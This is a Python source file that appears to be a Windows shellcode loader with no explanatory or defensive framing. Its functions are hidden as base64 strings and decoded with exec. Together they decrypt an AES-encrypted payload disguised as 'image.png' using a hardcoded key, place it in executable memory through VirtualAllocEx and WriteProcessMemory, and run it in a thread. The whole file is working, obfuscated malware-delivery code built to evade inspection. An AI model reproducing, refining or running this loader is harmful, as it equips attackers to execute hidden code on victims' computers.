import ctypes
import threading
import os
import sys
import base64
from ctypes import wintypes

MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_READWRITE = 0x04
PAGE_EXECUTE_READWRITE = 0x40

kernel32 = ctypes.windll.kernel32
kernel32.GetCurrentProcess.restype = wintypes.HANDLE
kernel32.VirtualAllocEx.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]
kernel32.VirtualAllocEx.restype = wintypes.LPVOID
kernel32.WriteProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
kernel32.WriteProcessMemory.restype = wintypes.BOOL

ENCODED_FUNCTIONS = {
    'derive_key': 'ZGVmIGRlcml2ZV9rZXkoa2V5X3N0cmluZywga2V5X3NpemU9MTYpOgogICAgaW1wb3J0IGhhc2hsaWIKICAgIGtleV9oYXNoID0gaGFzaGxpYi5zaGEyNTYoa2V5X3N0cmluZy5lbmNvZGUoKSkuZGlnZXN0KCkKICAgIHJldHVybiBrZXlfaGFzaFs6a2V5X3NpemVd',
    
    'decrypt_shellcode': 'ZGVmIGRlY3J5cHRfc2hlbGxjb2RlKGVuY3J5cHRlZF9kYXRhLCBrZXlfc3RyaW5nKToKICAgIHRyeToKICAgICAgICBmcm9tIENyeXB0by5DaXBoZXIgaW1wb3J0IEFFUwogICAgICAgIGZyb20gQ3J5cHRvLlV0aWwuUGFkZGluZyBpbXBvcnQgdW5wYWQKICAgICAgICAKICAgICAgICBrZXkgPSBkZXJpdmVfa2V5KGtleV9zdHJpbmcpCiAgICAgICAgaXYgPSBlbmNyeXB0ZWRfZGF0YVs6MTZdCiAgICAgICAgY2lwaGVydGV4dCA9IGVuY3J5cHRlZF9kYXRhWzE2Ol0KICAgICAgICBjaXBoZXIgPSBBRVMubmV3KGtleSwgQUVTLk1PREVfQ0JDLCBpdikKICAgICAgICBkZWNyeXB0ZWRfZGF0YSA9IHVucGFkKGNpcGhlci5kZWNyeXB0KGNpcGhlcnRleHQpLCBBRVMuYmxvY2tfc2l6ZSkKICAgICAgICByZXR1cm4gZGVjcnlwdGVkX2RhdGEKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICByZXR1cm4gTm9uZQ==',
    
    'load_shellcode_from_file': 'ZGVmIGxvYWRfc2hlbGxjb2RlX2Zyb21fZmlsZShmaWxlbmFtZSwgbWF4X3NpemU9MTAqMTAyNCoxMDI0LCBlbmNyeXB0ZWQ9RmFsc2UsIGtleT1Ob25lKToKICAgIHRyeToKICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoZmlsZW5hbWUpOgogICAgICAgICAgICByZXR1cm4gTm9uZQogICAgICAgIAogICAgICAgIGZpbGVfc2l6ZSA9IG9zLnBhdGguZ2V0c2l6ZShmaWxlbmFtZSkKICAgICAgICBwcmludChmIltMT0FEXSBGaWxlIHNpemU6IHtmaWxlX3NpemV9IGJ5dGVzIikKICAgICAgICBpZiBmaWxlX3NpemUgPT0gMDoKICAgICAgICAgICAgcmV0dXJuIE5vbmUKICAgICAgICAgICAgCiAgICAgICAgd2l0aCBvcGVuKGZpbGVuYW1lLCAncmInKSBhcyBmOgogICAgICAgICAgICBmaWxlX2RhdGEgPSBmLnJlYWQoKQogICAgICAgIAogICAgICAgIGlmIGVuY3J5cHRlZDoKICAgICAgICAgICAgaWYgbm90IGtleToKICAgICAgICAgICAgICAgIHJldHVybiBOb25lCiAgICAgICAgICAgIHNoZWxsY29kZSA9IGRlY3J5cHRfc2hlbGxjb2RlKGZpbGVfZGF0YSwga2V5KQogICAgICAgICAgICAKICAgICAgICAgICAgaWYgc2hlbGxjb2RlIGlzIE5vbmU6CiAgICAgICAgICAgICAgICByZXR1cm4gTm9uZQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcmV0dXJuIHNoZWxsY29kZQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHJldHVybiBmaWxlX2RhdGEKICAgICAgICAKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICByZXR1cm4gTm9uZQ==',
    
    'validate_environment': 'ZGVmIHZhbGlkYXRlX2Vudmlyb25tZW50KCk6CiAgICBpZiBvcy5uYW1lICE9ICdudCc6CiAgICAgICAgcHJpbnQoIjEiKQogICAgICAgIHJldHVybiBGYWxzZQogICAgCiAgICB0cnk6CiAgICAgICAgY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5HZXRDdXJyZW50UHJvY2VzcygpCiAgICAgICAgcmV0dXJuIFRydWUKICAgIGV4Y2VwdDoKICAgICAgICByZXR1cm4gRmFsc2U=',
    
    'execute_shellcode': 'ZGVmIGV4ZWN1dGVfc2hlbGxjb2RlKHNoZWxsY29kZSk6CiAgICB0cnk6CiAgICAgICAgY3VycmVudF9wcm9jZXNzID0ga2VybmVsMzIuR2V0Q3VycmVudFByb2Nlc3MoKQoKICAgICAgICBzY19tZW1vcnkgPSBrZXJuZWwzMi5WaXJ0dWFsQWxsb2NFeCgKICAgICAgICAgICAgY3VycmVudF9wcm9jZXNzLCAKICAgICAgICAgICAgTm9uZSwgCiAgICAgICAgICAgIGxlbihzaGVsbGNvZGUpLCAKICAgICAgICAgICAgTUVNX0NPTU1JVCB8IE1FTV9SRVNFUlZFLCAKICAgICAgICAgICAgUEFHRV9FWEVDVVRFX1JFQURXUklURQogICAgICAgICkKICAgICAgICAKICAgICAgICBpZiBub3Qgc2NfbWVtb3J5OgogICAgICAgICAgICByZXR1cm4gRmFsc2UKICAgICAgICAKICAgICAgICBieXRlc193cml0dGVuID0gY3R5cGVzLmNfc2l6ZV90KDApCiAgICAgICAgc3VjY2VzcyA9IGtlcm5lbDMyLldyaXRlUHJvY2Vzc01lbW9yeSgKICAgICAgICAgICAgY3VycmVudF9wcm9jZXNzLCAKICAgICAgICAgICAgc2NfbWVtb3J5LAogICAgICAgICAgICBzaGVsbGNvZGUsCiAgICAgICAgICAgIGxlbihzaGVsbGNvZGUpLAogICAgICAgICAgICBjdHlwZXMuYnlyZWYoYnl0ZXNfd3JpdHRlbikKICAgICAgICApCiAgICAgICAgCiAgICAgICAgaWYgbm90IHN1Y2Nlc3Mgb3IgYnl0ZXNfd3JpdHRlbi52YWx1ZSAhPSBsZW4oc2hlbGxjb2RlKToKICAgICAgICAgICAgcmV0dXJuIEZhbHNlCiAgICAgICAgICAgIAogICAgICAgIHNoZWxsX2Z1bmMgPSBjdHlwZXMuQ0ZVTkNUWVBFKE5vbmUpKHNjX21lbW9yeSkKICAgICAgICBzaGVsbF9mdW5jKCkKICAgICAgICAKICAgICAgICByZXR1cm4gVHJ1ZQogICAgICAgIAogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIGltcG9ydCB0cmFjZWJhY2sKICAgICAgICB0cmFjZWJhY2sucHJpbnRfZXhjKCkKICAgICAgICByZXR1cm4gRmFsc2U=',

    'ThreadFunction': 'ZGVmIFRocmVhZEZ1bmN0aW9uKCk6CiAgICBzaGVsbGNvZGUgPSBsb2FkX3NoZWxsY29kZV9mcm9tX2ZpbGUoImltYWdlLnBuZyIsIGVuY3J5cHRlZD1UcnVlLCBrZXk9IjEyMyIpCiAgICAKICAgIGlmIHNoZWxsY29kZSBpcyBOb25lOgogICAgICAgIGltcG9ydCBvcwogICAgICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cygiaW1hZ2UucG5nIik6CiAgICAgICAgICAgIHByaW50KCJnb29kIikKICAgICAgICBlbHNlOgogICAgICAgICAgICBwcmludCgiYmFkIikKICAgICAgICByZXR1cm4KICAgIGVsc2U6CiAgICAgICAgcmVzdWx0ID0gZXhlY3V0ZV9zaGVsbGNvZGUoc2hlbGxjb2RlKQogICAgICAgIAogICAgICAgIHJldHVybiByZXN1bHQ=',
    
    'Run': 'ZGVmIFJ1bigpOgogICAgaWYgbm90IHZhbGlkYXRlX2Vudmlyb25tZW50KCk6CiAgICAgICAgcmV0dXJuCiAgICAKICAgIHRocmVhZCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PVRocmVhZEZ1bmN0aW9uKQogICAgdGhyZWFkLnN0YXJ0KCkKCiAgICB0aHJlYWQuam9pbigp',
}

DECODED_FUNCTIONS = {}

def decode_function(func_name):
    if func_name in DECODED_FUNCTIONS:
        return DECODED_FUNCTIONS[func_name]
    
    if func_name in ENCODED_FUNCTIONS:
        try:
            func_code = base64.b64decode(ENCODED_FUNCTIONS[func_name]).decode('utf-8')
            exec_globals = {
                'ctypes': ctypes,
                'threading': threading,
                'os': os,
                'sys': sys,
                'base64': base64,
                'wintypes': wintypes,
                'kernel32': kernel32,
                'MEM_COMMIT': MEM_COMMIT,
                'MEM_RESERVE': MEM_RESERVE,
                'PAGE_READWRITE': PAGE_READWRITE,
                'PAGE_EXECUTE_READWRITE': PAGE_EXECUTE_READWRITE,
                'print': print,
                'derive_key': DECODED_FUNCTIONS.get('derive_key'),
                'decrypt_shellcode': DECODED_FUNCTIONS.get('decrypt_shellcode'),
                'load_shellcode_from_file': DECODED_FUNCTIONS.get('load_shellcode_from_file'),
                'validate_environment': DECODED_FUNCTIONS.get('validate_environment'),
                'execute_shellcode': DECODED_FUNCTIONS.get('execute_shellcode'),
                'ThreadFunction': DECODED_FUNCTIONS.get('ThreadFunction'),
                'Run': DECODED_FUNCTIONS.get('Run')
            }

            exec_globals = {k: v for k, v in exec_globals.items() if v is not None}
            
            exec(func_code, exec_globals)
            
            func = exec_globals[func_name]
            DECODED_FUNCTIONS[func_name] = func
            return func
            
        except Exception as e:
            import traceback
            traceback.print_exc()
            return None
    else:
        return None

def decode_and_execute(func_name, *args, **kwargs):
    dependency_order = [
        'derive_key',
        'decrypt_shellcode',
        'load_shellcode_from_file',
        'validate_environment',
        'execute_shellcode',
        'ThreadFunction',
        'Run'
    ]
    
    for dep_func in dependency_order:
        if dep_func in ENCODED_FUNCTIONS and dep_func not in DECODED_FUNCTIONS:
            result = decode_function(dep_func)
            if result is None and dep_func == func_name:
                return None
    
    if func_name in DECODED_FUNCTIONS:
        func = DECODED_FUNCTIONS[func_name]
        result = func(*args, **kwargs)
        return result
    else:
        func = decode_function(func_name)
        if func:
            result = func(*args, **kwargs)
            return result
        else:
            return None

if __name__ == "__main__":
    result = decode_and_execute('Run')
    print(f"[MAIN] Run result: {result}")